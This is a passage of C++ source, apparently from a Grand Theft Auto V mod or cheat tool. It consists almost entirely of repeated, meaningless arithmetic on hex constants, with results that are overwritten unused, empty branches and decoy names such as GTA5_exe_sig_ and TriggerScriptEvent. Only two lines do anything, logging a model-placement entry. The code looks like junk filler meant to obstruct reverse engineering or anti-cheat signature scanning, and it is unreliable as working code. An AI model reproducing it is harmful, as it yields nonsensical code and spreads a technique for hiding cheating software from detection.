			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("<Placement>");
			Extern_Reader::LOG::LogSemHora("<ModelHash>" + to_string(Estrutura.Hash) + "</ModelHash>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
